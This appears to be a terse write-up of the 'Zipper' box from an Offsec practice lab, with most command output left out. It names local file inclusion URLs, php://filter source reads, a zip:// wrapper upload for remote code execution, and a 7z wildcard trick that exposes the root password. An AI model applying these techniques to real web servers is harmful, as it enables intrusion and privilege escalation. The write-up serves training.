###### tags: `Offsec` `PG Practice` `Hard` `Linux` # Zipper
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Go to 80portcanClick`http://192.168.221.229/index.php?file=home`,try[LFI](https://github.com/russweir/OSCP-cheatsheet/blob/master/File%20Inclusion.md)
```
...
?>
``` Check`http://192.168.221.229/index.php?file=php://filter/convert.base64-encode/resource=home`
```
...
...
``` Check`http://192.168.221.229/index.php?file=php://filter/convert.base64-encode/resource=upload`
```
...
...
``` Refer tocheat sheet[PHP ZIP:// WRAPPER FOR RCE](https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38--------------------------------)uploadzipGo to `192.168.221.229/index.php?file=zip://uploads/upload_1716196660.zip%23shell`get `www-data` user,`var/www`get local.txt
```
┌──(kali㉿kali)-[~/pgplay]
...
``` Check[Wildcards Spare tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----b49a52ed8e38--------------------------------#id-7z)Check`/var/www/html/uploads``/root/secret`
```
...
----------------
Scan WARNINGS: 1
``` get `root`'s password`WildCardsGoingWild`,root/rootget proof.txt
```
